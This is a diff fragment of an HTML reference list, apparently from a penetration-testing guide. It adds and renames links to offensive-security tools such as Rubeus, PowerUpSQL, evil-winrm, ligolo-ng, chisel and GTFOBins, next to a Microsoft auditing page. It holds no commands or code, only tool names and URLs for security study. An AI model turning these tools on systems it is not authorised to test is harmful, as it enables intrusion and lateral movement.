+        <li>Rubeus — <a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">github.com/GhostPack/Rubeus</a></li>
+        <li>PowerUpSQL — <a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">github.com/NetSPI/PowerUpSQL</a></li>
         <li>ligolo-ng — <a href="https://github.com/nicocha30/ligolo-ng" target="_blank" rel="noopener">github.com/nicocha30/ligolo-ng</a></li>
         <li>chisel — <a href="https://github.com/jpillora/chisel" target="_blank" rel="noopener">github.com/jpillora/chisel</a></li>
-        <li>Evil-WinRM — <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener">github.com/Hackplayers/evil-winrm</a></li>
-        <li>MITRE ATT&amp;CK — Lateral Movement (TA0008) — <a href="https://attack.mitre.org/tactics/TA0008/" target="_blank" rel="noopener">attack.mitre.org</a></li>
+        <li>evil-winrm — <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener">github.com/Hackplayers/evil-winrm</a></li>
+        <li>GTFOBins (sudo abuse 用 binary catalog) — <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">gtfobins.github.io</a></li>
+        <li>Windows Security Log Event IDs — <a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/security-auditing-overview" target="_blank" rel="noopener">learn.microsoft.com — Security auditing overview</a></li>
       </ul>
     </section>
 
